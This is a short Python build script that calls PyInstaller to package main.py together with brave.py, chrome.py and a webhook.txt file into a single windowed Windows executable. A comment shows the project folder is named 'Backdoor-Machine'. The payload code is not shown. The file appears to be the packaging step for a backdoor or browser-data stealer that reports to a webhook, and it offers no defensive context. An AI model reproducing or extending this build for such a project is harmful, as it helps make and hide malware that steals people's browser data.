import pathlib
import subprocess

filePath = str(pathlib.Path(__file__).parent.absolute())

subprocess.call("pyinstaller --noconfirm --onefile --windowed --add-data \"brave.py;.\" --add-data \"chrome.py;.\" --add-data \"webhook.txt;.\" --clean --hidden-import \"win32api\" \"main.py\"", shell=True)
# pyinstaller --noconfirm --onefile --console --add-data "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/brave.py;." --add-data "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/chrome.py;." --add-data "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/webhook.txt;." --hidden-import "win32api"  "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/main.py"
